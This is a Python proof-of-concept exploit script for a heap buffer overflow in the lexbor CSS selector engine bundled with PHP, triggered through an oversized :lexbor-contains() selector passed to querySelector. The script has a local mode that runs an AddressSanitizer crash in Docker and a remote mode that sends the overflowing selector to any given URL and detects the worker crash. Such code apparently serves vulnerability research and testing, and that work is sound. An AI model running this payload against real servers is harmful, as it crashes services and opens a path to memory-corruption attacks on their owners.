#!/usr/bin/env python3
# INDEX: lexbor :lexbor-contains() selector heap buffer overflow | all | needs queryselector sink
"""lexbor_contains_overflow.py - crash PoC / oracle for the bundled lexbor
:lexbor-contains() CSS-selector heap buffer overflow (NET-NEW bug, distinct from
CVE-2026-109618/109619).

ext/dom/lexbor/lexbor/css/selectors/pseudo_state.c: the :lexbor-contains("...")
handler allocs a 16B slot then memcpy's attacker length+1 bytes -> heap overflow.
Reached via Dom\\HTMLDocument::querySelector[All](). Affected 8.4.26/8.5.11, fixed
8.5.12. --local runs the ASan crash PoC in a container; --target URL hits a
selector sink and detects worker death (remote crash oracle).

Usage:
  python3 -I poc/bugs/lexbor_contains_overflow.py --local
  python3 -I poc/bugs/lexbor_contains_overflow.py --target http://127.0.0.1:8090 [--len N]
"""
import argparse, subprocess, sys, pathlib, urllib.parse, urllib.request, urllib.error, http.client, socket

IMAGE = "php2shell-lexbor-asan:latest"
ROOT = pathlib.Path(__file__).resolve().parent.parent.parent
LAB = ROOT / "lab" / "lexbor"
ASAN_SIG = "AddressSanitizer: heap-buffer-overflow"
FRAME = "lxb_css_selectors_state_pseudo_class_function_lexbor_contains"

_POC_ROOT = str(pathlib.Path(__file__).resolve().parents[1])  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.asan_diff import has_uaf  # noqa: E402


def run_local(length):
    cmd = ["docker", "run", "--rm", "-v", f"{LAB}:/work:ro",
           "-e", "ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:exitcode=99",
           "-e", "USE_ZEND_ALLOC=0", "-e", "USE_TRACKED_ALLOC=1",
           IMAGE, "php", "-n", "/work/lexbor_overflow.php", str(length)]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    out = (p.stdout or "") + (p.stderr or "")
    hit = has_uaf(out, frame=FRAME)
    print(out.strip())
    print()
    if hit:
        print(f"[+] CONFIRMED: heap-buffer-overflow in {FRAME} (rc={p.returncode})")
        return 0
    print("[-] no ASan overflow observed")
    return 1


def run_remote(target, length):
    payload = "A" * length
    sel = ':lexbor-contains("' + payload + '")'
    url = target.rstrip("/") + "/selector.php?sel=" + urllib.parse.quote(sel)
    print(f"[*] sending {length}-byte :lexbor-contains() selector to {target}")
    # baseline: confirm the sink is alive with a benign selector
    base = target.rstrip("/") + "/selector.php?sel=" + urllib.parse.quote(':lexbor-contains("ok")')
    try:
        with urllib.request.urlopen(base, timeout=10) as r:
            print("[*] baseline sink OK: " + r.read().decode(errors="replace").strip())
    except Exception as e:
        print(f"[-] baseline request failed ({e}); is the lab up?")
        return 2
    crashed = False
    try:
        with urllib.request.urlopen(url, timeout=15) as r:
            body = r.read().decode(errors="replace").strip()
            print("[*] response: " + body)
    except (urllib.error.URLError, http.client.RemoteDisconnected,
            ConnectionResetError, socket.timeout) as e:
        crashed = True
        print(f"[+] worker died on oversized selector: {type(e).__name__}: {e}")
    if crashed:
        print("[+] CONFIRMED (remote oracle): oversized :lexbor-contains() crashed the worker")
        print("    (ASan report is in `docker compose -f docker-compose.fpm-avenues.yml -p p2s-lexbor --profile lexbor logs lexbor-lexbor`)")
        return 0
    print("[-] worker survived; on ASan builds the overflow should abort it")
    return 1


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--local", action="store_true", help="run ASan crash PoC in container")
    ap.add_argument("--target", help="selector-sink base URL (remote oracle)")
    ap.add_argument("--len", type=int, default=16384, help="argument length (bytes)")
    a = ap.parse_args()
    if a.target:
        sys.exit(run_remote(a.target, a.len))
    # default to local ASan proof
    sys.exit(run_local(a.len))


if __name__ == "__main__":
    main()
